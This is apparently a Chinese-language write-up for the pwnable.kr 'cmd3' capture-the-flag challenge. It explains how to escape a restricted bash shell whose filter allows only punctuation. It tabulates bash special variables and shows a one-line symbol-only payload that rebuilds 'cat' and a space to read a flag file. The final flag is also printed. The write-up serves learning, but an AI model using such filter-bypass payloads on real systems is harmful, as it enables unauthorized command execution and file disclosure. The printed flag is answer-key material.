# pwnable.kr 'cmd3' writeup

### 可用的字符

```
$ ( , < @ \ # + / ; ? [ _ { . : > ^ ~ % ) - = ] }
```

### 已知的限制

/bin/rbash: line 1: /: restricted: cannot specify `/' in command names

rbash 中不能在命令中使用/， 但是可以在参数中使用

###目前探知可用的字符组合

| 字符组合          | 含义                                       |
| ------------- | ---------------------------------------- |
| $( )          | 执行某一个命令                                  |
| $@            | 和$*类似，指所有参数                              |
| $*            | 所有参数                                     |
| $?            | 返回上一条命令的执行结果，但是目前总是返回0                   |
| $$            | 返回当前 shell 的 pid                         |
| $_            | 返回上一条命令的命令名（无参数）或者最后一个参数                 |
| .             | 等同于 source，导入文件                          |
| %             | 等同于%1，调用 jobs 中的第一个 job                  |
| $((exp))      | 对表达式进行数学运算                               |
| ?             | bash中的通配符，可以匹配一个字母, 可以这样读取一个文件的内容`cat ????/??????` |
| ${#var}       | 返回变量的string length.如果 var 是 array，那么返回数组的第一个元素的长度（可以构造任意的数字了） |
| var=({a,b,c}) | 大括号扩展，生成一个数组                             |
| ${array[@]}   | 将数组的所有元素以空白符分隔，转换为字符串                    |
| ${var}        | 引用变量                                     |
| ${var:1:2}    | 相当于substr(var, start, length)            |
|               |                                          |
|               |                                          |
|               |                                          |
|               |                                          |

source 和 `.` 的区别： source 的参数为当前目录下的文件的时候可以不用加`./`而`.`必须要加上`./`

#### 整体思路

这道题最后还是没有独立做出来，看了这位仁兄的 [writeup](http://alkalinesecurity.com/blog/ctf-writeups/pwnable-challenge-cmd3/) 以及 Bash 的 [Manual](http://tldp.org/LDP/abs/html/special-chars.html)这道题的思路是最后 要构造一条命令`$(cat /tmp/___)`, 而/tmp/___这个文件里面的内容是`cat /home/cmd3\_pwn/flagbox/$filename`, filename 是一个长度为32位的随机字符串，但是 nc 连上 shell 之后程序会告诉你filename 的值。而要构造出这个命令，关键是要构造出 cat 和空格，而 cat 和空格都是被过滤掉的。

#### 构造 cat

构造 cat 需要用的`_`这个变量，关于这个变量 bash manual 里面的说明是这样的。




> 1. At shell startup, set to the absolute pathname used to invoke the shell or shell script being executed as passed in the environment or argument list.
> 2. Subsequently, expands to the last argument to the previous command, after expansion.
> 3. Also set to the full pathname used to invoke each command executed and placed in the environment exported to that command.
> 4. When checking mail, this parameter holds the name of the mail file.

从中可以看出`_`这个变量会被设置成执行命令的完整路径名，在这个命令没有参数的情况下。所以`jail/cat;echo $_`就会打印出jail/cat， 虽然 rbash 限制了命令中不能带有`/`，但是不影响`_`的设置（why？）。但是`jail/cat`也带有字母啊，这就要用到`?`这个通配符了，`?`可以通配任意一个字符。

```shell
➜  cmd3 nc pwnable.kr 9023
total 4940
drwxr-x---  5 root cmd3_pwn    4096 Mar 15  2016 .
drwxr-xr-x 80 root root        4096 Jan 11 23:27 ..
d---------  2 root root        4096 Jan 22  2016 .bash_history
-rwxr-x---  1 root cmd3_pwn    1421 Mar 11  2016 cmd3.py
drwx-wx---  2 root cmd3_pwn   24576 Apr 19 03:07 flagbox
drwxr-x---  2 root cmd3_pwn    4096 Jan 22  2016 jail
-rw-r--r--  1 root root     5009202 Apr 19 05:12 log
-rw-r-----  1 root root         764 Mar 10  2016 super.pl
total 8
drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .
drwxr-x--- 5 root cmd3_pwn 4096 Mar 15  2016 ..
lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -> /bin/cat
lrwxrwxrwx 1 root root       11 Jan 22  2016 id -> /usr/bin/id
lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -> /bin/ls
```

可以观察看出 jail 命令下有三个命令，cat、id 和 ls，有用的只有 cat。`????/???`这条命令正好可以匹配到`jail/cat`，所以我们就能成功的把 `_`设置成`jail/cat`了。但是最终的命令中不能包含`/`，所以我们还需要要用到`${_:5:3}`这个语法，这个语法相当于`substr($_, 5, 3)`， 从字符串的索引为5的字符开始，截取三个字符，这样就能得到`cat` 了。

#### 构造空格

下一步就是构造空格了，我们可以用大括号的语法生成一个数组, `a=({.,.})`，然后把这个数组转换成用空格分割的 string, `b=${a[@]}`然后再截取出中间的空格就行了。也可以采用另一种方式构造数组

```shell
➜  cmd3 __=$(($$/$$))					# __=1
➜  cmd3 ___[${__}]=.					# ___[1]=.
➜  cmd3 ____=$((${__}+${__}))			# ____=2
➜  cmd3 ___[${____}]=.					# ___[2]=.
➜  cmd3 echo $___			#echo 数组的时候会用空格分割各个元素
. .
➜  cmd3 _____=${___[@]}		# _____=. . (数组转换成 sting)
➜  cmd3 ______=${_____:__:__};echo -n $______ #截取空格符
 %
```



#### 最后的脚本

```shell
#分步说明
__=$(($$/$$))			#(2)__=1
___=$((${__}+${__}))	#(3)___=2
____=$((${___}+${__}))	#(4)____=3
_____=({.,.})			#(5)_____=. .(array)
________=${_____[@]}	#(8)________=. .(string)
______=${________:__:__}	#(6)______=[space]
_______=$((${___}+${____}))	#(7)_______=5
????/???				#jail/cat, makes $_ to jail/cat
$(${_:_______:____}${______}/???/___)	#$(cat /tmp/___)

#连在一起成为一条命令
__=$(($$/$$));___=$((${__}+${__}));____=$((${___}+${__}));_____=({.,.});________=${_____[@]};______=${________:__:__};_______=$((${___}+${____}));????/???;$(${_:_______:____}${______}/???/___)

```

```
__=$(($$/$$));___=$((${__}+${__}));____=$((${___}+${__}));_____=({.,.});________=${_____[@]};______=${________:__:__};_______=$((${___}+${____}));$(.${______}/tmp/___)
```



### 坑点

1. 在远程 shell 上用`__=$(($$/$$))`给变量赋值之后， 下一条命令`$__`，shell 却没有任何输出，按道理应该会输出command 1 not found的，但是在自己的本地 shell 上是输出的。后来发现把这两条命令用分号连起来，`__=$(($$/$$));$__` 就能成功输出了。

2. 一开始是想用`.`这个符号构造    

   `$(. ???????/????????????????????????????????)`的，但是作者肯定也考虑到了这点，把 flagbox 这个目录设置成不可读的，所以通配符就失去了作用，因为通配符要能起作用是建立在 bash 能读取这个文件夹的内容，然后找到匹配的文件的情况下的。

3. $(. /???/___)似乎也是一个思路，在 bash 下是可行的，但是在 rbash 下面不可行

   ```shell
   dddong@ubuntu:/media/psf/Home/workspace/CTF/pwnable/cmd3$ . /tmp/___
   rbash: .: /tmp/___: restricted


   ```

   可能是 rbash 限制了 source 功能吧， 如果`.`的参数带有`/`，就会输出 restricted，如果不带有`/`

   ```shell
   dddong@ubuntu:/media/psf/Home/workspace/CTF/pwnable/cmd3$ . test.sh
   rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
   ```

   就会输出这么一串奇怪的东西



#### 最终 flag

flag： D4ddy_c4n_n3v3r_St0p_m3_haha